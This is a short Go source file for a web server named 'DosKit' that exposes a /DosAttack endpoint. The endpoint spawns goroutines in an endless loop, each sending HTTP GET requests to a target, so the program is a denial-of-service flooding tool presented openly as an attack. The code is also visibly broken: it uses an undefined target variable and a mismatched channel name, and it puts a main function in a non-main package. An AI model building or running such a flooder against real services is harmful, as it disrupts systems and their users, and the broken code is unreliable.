package server

import (
	"fmt"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

func attackHandler(w http.ResponseWriter, r *http.Request) {
	responseChannel := make(chan interface{})
	for {
		go func(){
			resp, err := http.Get(target)
			if err != nil {
				panic(err)
			}
			resChannel <- resp						
		}()
	}
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusCreated)
	w.Header().Set("Content-Type", "application/html; charset=UTF-8")
	fmt.Fprintf(w, "This is DosKit Server: %s\n", r.URL.Path)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/DosAttack", attackHandler).Methods("POST")
	r.HandleFunc("/", indexHandler).Methods("GET")
	http.Handle("/", r)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
